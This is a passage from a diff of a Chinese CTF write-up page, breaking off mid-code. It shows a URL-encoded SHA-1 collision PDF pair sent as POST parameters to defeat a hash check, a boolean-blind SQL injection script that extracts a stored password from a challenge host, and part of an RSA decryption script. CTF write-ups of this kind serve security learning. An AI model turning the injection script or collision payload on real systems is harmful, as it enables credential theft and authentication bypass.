class="hljs-symbol">%20</span>R/Filter<span class="hljs-symbol">%206</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>R/ColorSpace<span class="hljs-symbol">%207</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>R/Length<span class="hljs-symbol">%208</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>R/BitsPerComponent<span class="hljs-symbol">%208</span><span class="hljs-symbol">%3</span>E<span class="hljs-symbol">%3</span>E<span class="hljs-symbol">%0</span>Astream<span class="hljs-symbol">%0</span>A<span class="hljs-symbol">%FF</span><span class="hljs-symbol">%D8</span><span class="hljs-symbol">%FF</span><span class="hljs-symbol">%FE</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%24</span>SHA<span class="hljs-number">-1</span><span class="hljs-symbol">%20</span>is<span class="hljs-symbol">%20</span>dead<span class="hljs-symbol">%21</span><span class="hljs-symbol">%21</span><span class="hljs-symbol">%21</span><span class="hljs-symbol">%21</span><span class="hljs-symbol">%21</span><span class="hljs-symbol">%85</span>/<span class="hljs-symbol">%EC</span><span class="hljs-symbol">%09</span><span class="hljs-symbol">%239</span>u<span class="hljs-symbol">%9</span>C<span class="hljs-number">9</span><span class="hljs-symbol">%B1</span><span class="hljs-symbol">%A1</span><span class="hljs-symbol">%C6</span><span class="hljs-symbol">%3</span>CL<span class="hljs-symbol">%97</span><span class="hljs-symbol">%E1</span><span class="hljs-symbol">%FF</span><span class="hljs-symbol">%FE</span><span class="hljs-symbol">%01</span><span class="hljs-symbol">%7</span>FF<span class="hljs-symbol">%DC</span><span class="hljs-symbol">%93</span><span class="hljs-symbol">%A6</span><span class="hljs-symbol">%B6</span><span class="hljs-symbol">%7</span>E<span class="hljs-symbol">%01</span><span class="hljs-symbol">%3</span>B<span class="hljs-symbol">%02</span><span class="hljs-symbol">%9</span>A<span class="hljs-symbol">%AA</span><span class="hljs-symbol">%1</span>D<span class="hljs-symbol">%B2V</span><span class="hljs-symbol">%0</span>BE<span class="hljs-symbol">%CAg</span><span class="hljs-symbol">%D6</span><span class="hljs-symbol">%88</span><span class="hljs-symbol">%C7</span><span class="hljs-symbol">%F8K</span><span class="hljs-symbol">%8</span>CLy<span class="hljs-symbol">%1</span>F<span class="hljs-symbol">%E0</span><span class="hljs-symbol">%2</span>B<span class="hljs-symbol">%3</span>D<span class="hljs-symbol">%F6</span><span class="hljs-symbol">%14</span><span class="hljs-symbol">%F8m</span><span class="hljs-symbol">%B1i</span><span class="hljs-symbol">%09</span><span class="hljs-symbol">%01</span><span class="hljs-symbol">%C5kE</span><span class="hljs-symbol">%C1S</span><span class="hljs-symbol">%0</span>A<span class="hljs-symbol">%FE</span><span class="hljs-symbol">%DF</span><span class="hljs-symbol">%B7</span><span class="hljs-symbol">%608</span><span class="hljs-symbol">%E9rr</span>/<span class="hljs-symbol">%E7</span><span class="hljs-symbol">%ADr</span><span class="hljs-symbol">%8</span>F<span class="hljs-symbol">%0</span>EI<span class="hljs-symbol">%04</span><span class="hljs-symbol">%E0F</span><span class="hljs-symbol">%C20W</span><span class="hljs-symbol">%0</span>F<span class="hljs-symbol">%E9</span><span class="hljs-symbol">%D4</span><span class="hljs-symbol">%13</span><span class="hljs-symbol">%98</span><span class="hljs-symbol">%AB</span><span class="hljs-symbol">%E1.</span><span class="hljs-symbol">%F5</span><span class="hljs-symbol">%BC</span><span class="hljs-symbol">%94</span><span class="hljs-symbol">%2</span>B<span class="hljs-symbol">%E35B</span><span class="hljs-symbol">%A4</span><span class="hljs-symbol">%80</span>-<span class="hljs-symbol">%98</span><span class="hljs-symbol">%B5</span><span class="hljs-symbol">%D7</span><span class="hljs-symbol">%0</span>F<span class="hljs-symbol">%2</span>A<span class="hljs-number">3</span>.<span class="hljs-symbol">%C3</span><span class="hljs-symbol">%7</span>F<span class="hljs-symbol">%AC5</span><span class="hljs-symbol">%14</span><span class="hljs-symbol">%E7M</span><span class="hljs-symbol">%DC</span><span class="hljs-symbol">%0</span>F<span class="hljs-symbol">%2</span>C<span class="hljs-symbol">%C1</span><span class="hljs-symbol">%A8t</span><span class="hljs-symbol">%CD</span><span class="hljs-symbol">%0</span>Cx<span class="hljs-number">0</span>Z<span class="hljs-symbol">%21</span>Vda<span class="hljs-number">0</span><span class="hljs-symbol">%97</span><span class="hljs-symbol">%89</span><span class="hljs-symbol">%60</span>k<span class="hljs-symbol">%D0</span><span class="hljs-symbol">%BF</span><span class="hljs-symbol">%3</span>F<span class="hljs-symbol">%98</span><span class="hljs-symbol">%CD</span><span class="hljs-symbol">%A8</span><span class="hljs-symbol">%04</span>F<span class="hljs-symbol">%29</span><span class="hljs-symbol">%A1</span>&amp;param<span class="hljs-number">2</span>=<span class="hljs-symbol">%25</span>PDF<span class="hljs-number">-1.3</span><span class="hljs-symbol">%0</span>A<span class="hljs-symbol">%25</span><span class="hljs-symbol">%E2</span><span class="hljs-symbol">%E3</span><span class="hljs-symbol">%CF</span><span class="hljs-symbol">%D3</span><span class="hljs-symbol">%0</span>A<span class="hljs-symbol">%0</span>A<span class="hljs-symbol">%0</span>A<span class="hljs-number">1</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>obj<span class="hljs-symbol">%0</span>A<span class="hljs-symbol">%3</span>C<span class="hljs-symbol">%3</span>C/Width<span class="hljs-symbol">%202</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>R/Height<span class="hljs-symbol">%203</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>R/Type<span class="hljs-symbol">%204</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>R/Subtype<span class="hljs-symbol">%205</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>R/Filter<span class="hljs-symbol">%206</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>R/ColorSpace<span class="hljs-symbol">%207</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>R/Length<span class="hljs-symbol">%208</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>R/BitsPerComponent<span class="hljs-symbol">%208</span><span class="hljs-symbol">%3</span>E<span class="hljs-symbol">%3</span>E<span class="hljs-symbol">%0</span>Astream<span class="hljs-symbol">%0</span>A<span class="hljs-symbol">%FF</span><span class="hljs-symbol">%D8</span><span class="hljs-symbol">%FF</span><span class="hljs-symbol">%FE</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%24</span>SHA<span class="hljs-number">-1</span><span class="hljs-symbol">%20</span>is<span class="hljs-symbol">%20</span>dead<span class="hljs-symbol">%21</span><span class="hljs-symbol">%21</span><span class="hljs-symbol">%21</span><span class="hljs-symbol">%21</span><span class="hljs-symbol">%21</span><span class="hljs-symbol">%85</span>/<span class="hljs-symbol">%EC</span><span class="hljs-symbol">%09</span><span class="hljs-symbol">%239</span>u<span class="hljs-symbol">%9</span>C<span class="hljs-number">9</span><span class="hljs-symbol">%B1</span><span class="hljs-symbol">%A1</span><span class="hljs-symbol">%C6</span><span class="hljs-symbol">%3</span>CL<span class="hljs-symbol">%97</span><span class="hljs-symbol">%E1</span><span class="hljs-symbol">%FF</span><span class="hljs-symbol">%FE</span><span class="hljs-symbol">%01</span>sF<span class="hljs-symbol">%DC</span><span class="hljs-symbol">%91</span>f<span class="hljs-symbol">%B6</span><span class="hljs-symbol">%7</span>E<span class="hljs-symbol">%11</span><span class="hljs-symbol">%8</span>F<span class="hljs-symbol">%02</span><span class="hljs-symbol">%9</span>A<span class="hljs-symbol">%B6</span><span class="hljs-symbol">%21</span><span class="hljs-symbol">%B2V</span><span class="hljs-symbol">%0</span>F<span class="hljs-symbol">%F9</span><span class="hljs-symbol">%CAg</span><span class="hljs-symbol">%CC</span><span class="hljs-symbol">%A8</span><span class="hljs-symbol">%C7</span><span class="hljs-symbol">%F8</span><span class="hljs-symbol">%5</span>B<span class="hljs-symbol">%A8Ly</span><span class="hljs-symbol">%03</span><span class="hljs-symbol">%0</span>C<span class="hljs-symbol">%2</span>B<span class="hljs-symbol">%3</span>D<span class="hljs-symbol">%E2</span><span class="hljs-symbol">%18</span><span class="hljs-symbol">%F8m</span><span class="hljs-symbol">%B3</span><span class="hljs-symbol">%A9</span><span class="hljs-symbol">%09</span><span class="hljs-symbol">%01</span><span class="hljs-symbol">%D5</span><span class="hljs-symbol">%DFE</span><span class="hljs-symbol">%C1O</span><span class="hljs-symbol">%26</span><span class="hljs-symbol">%FE</span><span class="hljs-symbol">%DF</span><span class="hljs-symbol">%B3</span><span class="hljs-symbol">%DC8</span><span class="hljs-symbol">%E9j</span><span class="hljs-symbol">%C2</span>/<span class="hljs-symbol">%E7</span><span class="hljs-symbol">%BDr</span><span class="hljs-symbol">%8</span>F<span class="hljs-symbol">%0</span>EE<span class="hljs-symbol">%BC</span><span class="hljs-symbol">%E0F</span><span class="hljs-symbol">%D2</span><span class="hljs-symbol">%3</span>CW<span class="hljs-symbol">%0</span>F<span class="hljs-symbol">%EB</span><span class="hljs-symbol">%14</span><span class="hljs-symbol">%13</span><span class="hljs-symbol">%98</span><span class="hljs-symbol">%BBU.</span><span class="hljs-symbol">%F5</span><span class="hljs-symbol">%A0</span><span class="hljs-symbol">%A8</span><span class="hljs-symbol">%2</span>B<span class="hljs-symbol">%E31</span><span class="hljs-symbol">%FE</span><span class="hljs-symbol">%A4</span><span class="hljs-symbol">%807</span><span class="hljs-symbol">%B8</span><span class="hljs-symbol">%B5</span><span class="hljs-symbol">%D7</span><span class="hljs-symbol">%1</span>F<span class="hljs-symbol">%0</span>E<span class="hljs-number">3</span>.<span class="hljs-symbol">%DF</span><span class="hljs-symbol">%93</span><span class="hljs-symbol">%AC5</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%EBM</span><span class="hljs-symbol">%DC</span><span class="hljs-symbol">%0</span>D<span class="hljs-symbol">%EC</span><span class="hljs-symbol">%C1</span><span class="hljs-symbol">%A8dy</span><span class="hljs-symbol">%0</span>Cx<span class="hljs-symbol">%2</span>Cv<span class="hljs-symbol">%21</span>V<span class="hljs-symbol">%60</span><span class="hljs-symbol">%DD0</span><span class="hljs-symbol">%97</span><span class="hljs-symbol">%91</span><span class="hljs-symbol">%D0k</span><span class="hljs-symbol">%D0</span><span class="hljs-symbol">%AF</span><span class="hljs-symbol">%3</span>F<span class="hljs-symbol">%98</span><span class="hljs-symbol">%CD</span><span class="hljs-symbol">%A4</span><span class="hljs-symbol">%BCF</span><span class="hljs-symbol">%29</span><span class="hljs-symbol">%B1</span></code></pre></div>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST:</span><br><span class="line">param<span class="number">1</span><span class="operator">=</span><span class="variable">%25</span>PDF<span class="number">-1.3</span><span class="variable">%0</span>A<span class="variable">%25</span><span class="variable">%E2</span><span class="variable">%E3</span><span class="variable">%CF</span><span class="variable">%D3</span><span class="variable">%0</span>A<span class="variable">%0</span>A<span class="variable">%0</span>A<span class="number">1</span><span class="variable">%200</span><span class="variable">%20</span>obj<span class="variable">%0</span>A<span class="variable">%3</span>C<span class="variable">%3</span>C/Width<span class="variable">%202</span><span class="variable">%200</span><span class="variable">%20</span>R/Height<span class="variable">%203</span><span class="variable">%200</span><span class="variable">%20</span>R/Type<span class="variable">%204</span><span class="variable">%200</span><span class="variable">%20</span>R/Subtype<span class="variable">%205</span><span class="variable">%200</span><span class="variable">%20</span>R/Filter<span class="variable">%206</span><span class="variable">%200</span><span class="variable">%20</span>R/ColorSpace<span class="variable">%207</span><span class="variable">%200</span><span class="variable">%20</span>R/Length<span class="variable">%208</span><span class="variable">%200</span><span class="variable">%20</span>R/BitsPerComponent<span class="variable">%208</span><span class="variable">%3</span>E<span class="variable">%3</span>E<span class="variable">%0</span>Astream<span class="variable">%0</span>A<span class="variable">%FF</span><span class="variable">%D8</span><span class="variable">%FF</span><span class="variable">%FE</span><span class="variable">%00</span><span class="variable">%24</span>SHA<span class="number">-1</span><span class="variable">%20</span>is<span class="variable">%20</span>dead<span class="variable">%21</span><span class="variable">%21</span><span class="variable">%21</span><span class="variable">%21</span><span class="variable">%21</span><span class="variable">%85</span>/<span class="variable">%EC</span><span class="variable">%09</span><span class="variable">%239</span>u<span class="variable">%9</span>C<span class="number">9</span><span class="variable">%B1</span><span class="variable">%A1</span><span class="variable">%C6</span><span class="variable">%3</span>CL<span class="variable">%97</span><span class="variable">%E1</span><span class="variable">%FF</span><span class="variable">%FE</span><span class="variable">%01</span><span class="variable">%7</span>FF<span class="variable">%DC</span><span class="variable">%93</span><span class="variable">%A6</span><span class="variable">%B6</span><span class="variable">%7</span>E<span class="variable">%01</span><span class="variable">%3</span>B<span class="variable">%02</span><span class="variable">%9</span>A<span class="variable">%AA</span><span class="variable">%1</span>D<span class="variable">%B2V</span><span class="variable">%0</span>BE<span class="variable">%CAg</span><span class="variable">%D6</span><span class="variable">%88</span><span class="variable">%C7</span><span class="variable">%F8K</span><span class="variable">%8</span>CLy<span class="variable">%1</span>F<span class="variable">%E0</span><span class="variable">%2</span>B<span class="variable">%3</span>D<span class="variable">%F6</span><span class="variable">%14</span><span class="variable">%F8m</span><span class="variable">%B1i</span><span class="variable">%09</span><span class="variable">%01</span><span class="variable">%C5kE</span><span class="variable">%C1S</span><span class="variable">%0</span>A<span class="variable">%FE</span><span class="variable">%DF</span><span class="variable">%B7</span><span class="variable">%608</span><span class="variable">%E9rr</span>/<span class="variable">%E7</span><span class="variable">%ADr</span><span class="variable">%8</span>F<span class="variable">%0</span>EI<span class="variable">%04</span><span class="variable">%E0F</span><span class="variable">%C20W</span><span class="variable">%0</span>F<span class="variable">%E9</span><span class="variable">%D4</span><span class="variable">%13</span><span class="variable">%98</span><span class="variable">%AB</span><span class="variable">%E1.</span><span class="variable">%F5</span><span class="variable">%BC</span><span class="variable">%94</span><span class="variable">%2</span>B<span class="variable">%E35B</span><span class="variable">%A4</span><span class="variable">%80</span>-<span class="variable">%98</span><span class="variable">%B5</span><span class="variable">%D7</span><span class="variable">%0</span>F<span class="variable">%2</span>A<span class="number">3</span>.<span class="variable">%C3</span><span class="variable">%7</span>F<span class="variable">%AC5</span><span class="variable">%14</span><span class="variable">%E7M</span><span class="variable">%DC</span><span class="variable">%0</span>F<span class="variable">%2</span>C<span class="variable">%C1</span><span class="variable">%A8t</span><span class="variable">%CD</span><span class="variable">%0</span>Cx<span class="number">0</span>Z<span class="variable">%21</span>Vda<span class="number">0</span><span class="variable">%97</span><span class="variable">%89</span><span class="variable">%60</span>k<span class="variable">%D0</span><span class="variable">%BF</span><span class="variable">%3</span>F<span class="variable">%98</span><span class="variable">%CD</span><span class="variable">%A8</span><span class="variable">%04</span>F<span class="variable">%29</span><span class="variable">%A1</span>&amp;param<span class="number">2</span><span class="operator">=</span><span class="variable">%25</span>PDF<span class="number">-1.3</span><span class="variable">%0</span>A<span class="variable">%25</span><span class="variable">%E2</span><span class="variable">%E3</span><span class="variable">%CF</span><span class="variable">%D3</span><span class="variable">%0</span>A<span class="variable">%0</span>A<span class="variable">%0</span>A<span class="number">1</span><span class="variable">%200</span><span class="variable">%20</span>obj<span class="variable">%0</span>A<span class="variable">%3</span>C<span class="variable">%3</span>C/Width<span class="variable">%202</span><span class="variable">%200</span><span class="variable">%20</span>R/Height<span class="variable">%203</span><span class="variable">%200</span><span class="variable">%20</span>R/Type<span class="variable">%204</span><span class="variable">%200</span><span class="variable">%20</span>R/Subtype<span class="variable">%205</span><span class="variable">%200</span><span class="variable">%20</span>R/Filter<span class="variable">%206</span><span class="variable">%200</span><span class="variable">%20</span>R/ColorSpace<span class="variable">%207</span><span class="variable">%200</span><span class="variable">%20</span>R/Length<span class="variable">%208</span><span class="variable">%200</span><span class="variable">%20</span>R/BitsPerComponent<span class="variable">%208</span><span class="variable">%3</span>E<span class="variable">%3</span>E<span class="variable">%0</span>Astream<span class="variable">%0</span>A<span class="variable">%FF</span><span class="variable">%D8</span><span class="variable">%FF</span><span class="variable">%FE</span><span class="variable">%00</span><span class="variable">%24</span>SHA<span class="number">-1</span><span class="variable">%20</span>is<span class="variable">%20</span>dead<span class="variable">%21</span><span class="variable">%21</span><span class="variable">%21</span><span class="variable">%21</span><span class="variable">%21</span><span class="variable">%85</span>/<span class="variable">%EC</span><span class="variable">%09</span><span class="variable">%239</span>u<span class="variable">%9</span>C<span class="number">9</span><span class="variable">%B1</span><span class="variable">%A1</span><span class="variable">%C6</span><span class="variable">%3</span>CL<span class="variable">%97</span><span class="variable">%E1</span><span class="variable">%FF</span><span class="variable">%FE</span><span class="variable">%01</span>sF<span class="variable">%DC</span><span class="variable">%91</span>f<span class="variable">%B6</span><span class="variable">%7</span>E<span class="variable">%11</span><span class="variable">%8</span>F<span class="variable">%02</span><span class="variable">%9</span>A<span class="variable">%B6</span><span class="variable">%21</span><span class="variable">%B2V</span><span class="variable">%0</span>F<span class="variable">%F9</span><span class="variable">%CAg</span><span class="variable">%CC</span><span class="variable">%A8</span><span class="variable">%C7</span><span class="variable">%F8</span><span class="variable">%5</span>B<span class="variable">%A8Ly</span><span class="variable">%03</span><span class="variable">%0</span>C<span class="variable">%2</span>B<span class="variable">%3</span>D<span class="variable">%E2</span><span class="variable">%18</span><span class="variable">%F8m</span><span class="variable">%B3</span><span class="variable">%A9</span><span class="variable">%09</span><span class="variable">%01</span><span class="variable">%D5</span><span class="variable">%DFE</span><span class="variable">%C1O</span><span class="variable">%26</span><span class="variable">%FE</span><span class="variable">%DF</span><span class="variable">%B3</span><span class="variable">%DC8</span><span class="variable">%E9j</span><span class="variable">%C2</span>/<span class="variable">%E7</span><span class="variable">%BDr</span><span class="variable">%8</span>F<span class="variable">%0</span>EE<span class="variable">%BC</span><span class="variable">%E0F</span><span class="variable">%D2</span><span class="variable">%3</span>CW<span class="variable">%0</span>F<span class="variable">%EB</span><span class="variable">%14</span><span class="variable">%13</span><span class="variable">%98</span><span class="variable">%BBU.</span><span class="variable">%F5</span><span class="variable">%A0</span><span class="variable">%A8</span><span class="variable">%2</span>B<span class="variable">%E31</span><span class="variable">%FE</span><span class="variable">%A4</span><span class="variable">%807</span><span class="variable">%B8</span><span class="variable">%B5</span><span class="variable">%D7</span><span class="variable">%1</span>F<span class="variable">%0</span>E<span class="number">3</span>.<span class="variable">%DF</span><span class="variable">%93</span><span class="variable">%AC5</span><span class="variable">%00</span><span class="variable">%EBM</span><span class="variable">%DC</span><span class="variable">%0</span>D<span class="variable">%EC</span><span class="variable">%C1</span><span class="variable">%A8dy</span><span class="variable">%0</span>Cx<span class="variable">%2</span>Cv<span class="variable">%21</span>V<span class="variable">%60</span><span class="variable">%DD0</span><span class="variable">%97</span><span class="variable">%91</span><span class="variable">%D0k</span><span class="variable">%D0</span><span class="variable">%AF</span><span class="variable">%3</span>F<span class="variable">%98</span><span class="variable">%CD</span><span class="variable">%A4</span><span class="variable">%BCF</span><span class="variable">%29</span><span class="variable">%B1</span> </span><br></pre></td></tr></table></figure>
 
 <p><strong>还有一个很坑的地方，hackbar上传时没有作用，只能用bp抓包上传，抓包时注意先随便post一个参数，这样数据包才是post方式，然后贴上上面的两个参数值</strong></p>
 <h3 id="babysql2"><a href="#babysql2" class="headerlink" title="babysql2"></a>babysql2</h3><p>查询语句与第一个注入相同，但是这题不给回显，猜测是盲注，但是好像过滤了更多的关键字</p>
 <p>在1的基础上额外过滤了 ‘ ， ascii ， mid ， substr ，关闭了报错回显和输出，但是查询成功或者失败 回显不同，因此可以bool注入。</p>
-<div class="hljs"><pre><code class="hljs python">url = <span class="hljs-string">'http://219.219.61.234:20004/'</span>
-password = <span class="hljs-string">""</span>
-string = [ord(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz!_@-&#125;&#123;'</span>]<span class="hljs-comment">#将字母转换为ascii码</span>
-a = <span class="hljs-string">'0x5e'</span>   <span class="hljs-comment"># '\'的ascii码值</span>
-<span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>):
-    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> string:
-        <span class="hljs-keyword">if</span> (hex(j)[<span class="hljs-number">2</span>:]==<span class="hljs-string">'7b'</span>):
-            str=<span class="hljs-string">'5c'</span>+hex(j)[<span class="hljs-number">2</span>:]  <span class="hljs-comment">#将'&#123;'转义，</span>
-        <span class="hljs-keyword">else</span>:
-            str=hex(j)[<span class="hljs-number">2</span>:]
-
-        time.sleep(<span class="hljs-number">0.1</span>)
-
-        payload  =<span class="hljs-string">"||/**/(select/**/password/**/from/**/users/**/limit/**/9,1)/**/regexp/**/binary/**/%s/**/#"</span> % (a + str)
-<span class="hljs-comment"># 盲注的查询语句 regexp binary 是区分大小写的正则匹配</span>
-        data =&#123;<span class="hljs-string">"username"</span>:<span class="hljs-string">"\\"</span>,<span class="hljs-string">"password"</span>:payload&#125;
-        print(data)
-        r = requests.post(url,data=data) <span class="hljs-comment">#访问</span>
-        <span class="hljs-keyword">if</span> <span class="hljs-string">"success"</span> <span class="hljs-keyword">in</span> r.text:
-            <span class="hljs-comment">#print(r.text)</span>
-            password+=chr(j)
-            print(password)
-            a+=str      		
-            <span class="hljs-keyword">break</span>
-    <span class="hljs-keyword">if</span> <span class="hljs-string">"wrong"</span> <span class="hljs-keyword">in</span> r.text:
-        <span class="hljs-keyword">break</span>
-print(password)</code></pre></div>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="string">&#x27;http://219.219.61.234:20004/&#x27;</span></span><br><span class="line">password = <span class="string">&quot;&quot;</span></span><br><span class="line">string = [<span class="built_in">ord</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz!_@-&#125;&#123;&#x27;</span>]<span class="comment">#将字母转换为ascii码</span></span><br><span class="line">a = <span class="string">&#x27;0x5e&#x27;</span>   <span class="comment"># &#x27;\&#x27;的ascii码值</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> string:</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">hex</span>(j)[<span class="number">2</span>:]==<span class="string">&#x27;7b&#x27;</span>):</span><br><span class="line">            <span class="built_in">str</span>=<span class="string">&#x27;5c&#x27;</span>+<span class="built_in">hex</span>(j)[<span class="number">2</span>:]  <span class="comment">#将&#x27;&#123;&#x27;转义，</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">str</span>=<span class="built_in">hex</span>(j)[<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">        payload  =<span class="string">&quot;||/**/(select/**/password/**/from/**/users/**/limit/**/9,1)/**/regexp/**/binary/**/%s/**/#&quot;</span> % (a + <span class="built_in">str</span>)</span><br><span class="line"><span class="comment"># 盲注的查询语句 regexp binary 是区分大小写的正则匹配</span></span><br><span class="line">        data =&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;\\&quot;</span>,<span class="string">&quot;password&quot;</span>:payload&#125;</span><br><span class="line">        print(data)</span><br><span class="line">        r = requests.post(url,data=data) <span class="comment">#访问</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="comment">#print(r.text)</span></span><br><span class="line">            password+=<span class="built_in">chr</span>(j)</span><br><span class="line">            print(password)</span><br><span class="line">            a+=<span class="built_in">str</span>      		</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;wrong&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(password)</span><br></pre></td></tr></table></figure>
 
 <h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="幼儿园的密码题"><a href="#幼儿园的密码题" class="headerlink" title="幼儿园的密码题"></a>幼儿园的密码题</h3><p>先转换为十进制后在线分解后直接上脚本</p>
-<p><a href="http://www.factordb.com/" target="_blank" rel="noopener">http://www.factordb.com/</a> 在线分解网址</p>
-<div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> binascii
-<span class="hljs-keyword">import</span> sys
-sys.setrecursionlimit(<span class="hljs-number">1000000</span>)
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ByteToHex</span><span class="hljs-params">(bins)</span>:</span>
-  <span class="hljs-keyword">return</span> <span class="hljs-string">''</span>.join([<span class="hljs-string">"%02X"</span> % x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> bins]).strip()
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">n2s</span><span class="hljs-params">(num)</span>:</span>
-  t = hex(num)[<span class="hljs-number">2</span>:<span class="hljs-number">-1</span>]  <span class="hljs-comment"># python</span>
-  <span class="hljs-keyword">if</span> len(t) % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>:
-    t = <span class="hljs-string">'0'</span> + t
-  \<span class="hljs-comment">#print(t)</span>
-  <span class="hljs-keyword">return</span>(binascii.a2b_hex(t).decode(<span class="hljs-string">'latin1'</span>))
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">egcd</span><span class="hljs-params">(a, b)</span>:</span>
-  <span class="hljs-keyword">if</span> a == <span class="hljs-number">0</span>:
-    <span class="hljs-keyword">return</span> (b, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>)
-  <span class="hljs-keyword">else</span>:
-    g, y, x = egcd(b % a, a)
-    <span class="hljs-keyword">return</span> (g, x - (b // a) * y, y)
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">modinv</span><span class="hljs-params">(a, m)</span>:</span>
-  g, x, y = egcd(a, m)
-  <span class="hljs-keyword">if</span> g != <span class="hljs-number">1</span>:
-    print(<span class="hljs-string">'modular inverse does not exist'</span>)
-    <span class="hljs-keyword">return</span> <span class="hljs-string">'null'</span>
-  <span class="hljs-keyword">else</span>:
-    <span class="hljs-keyword">return</span> x % m
-c = <span class="hljs-number">40448992051548719008529549070468060415257485938698092782029814901918646701101</span>
-p = <span class="hljs-number">328413456989577256301798468872388310877</span>
-q = <span class="hljs-number">324350545929838254331191385863847627003</span>
-e = <span class="hljs-number">65537</span>
-n = p * q
-d = modinv(e, (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>))
-m = pow(c, d, n)
-
-<span class="hljs-keyword">print</span> (m)</code></pre></div>
+<p><a target="_blank" rel="noopener" href="http://www.factordb.com/">http://www.factordb.com/</a> 在线分解网址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.setrecursionlimit(<span class="number">1000000</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ByteToHex</span>(<span class="params">bins</span>):</span></span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="string">&quot;%02X&quot;</span> % x <span class="keyword">for</span> x <span class="keyword">in</span> bins]).strip()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">n2s</span>(<span class="params">num</span>):</span></span><br><span class="line">  t = <span class="built_in">hex</span>(num)[<span class="number">2</span>:-<span class="number">1</span>]  <span class="comment"># python</span></span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">len</span>(t) % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">    t = <span class="string">&#x27;0&#x27;</span> + t</span><br><span class="line">  \<span class="comment">#print(t)</span></span><br><span class="line">  <span class="keyword">return</span>(binascii.a2b_hex(t).decode(<span class="string">&#x27;latin1&#x27;</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span>(<span class="params">a, b</span>):</span></span><br><span class="line">  <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    g, y, x = 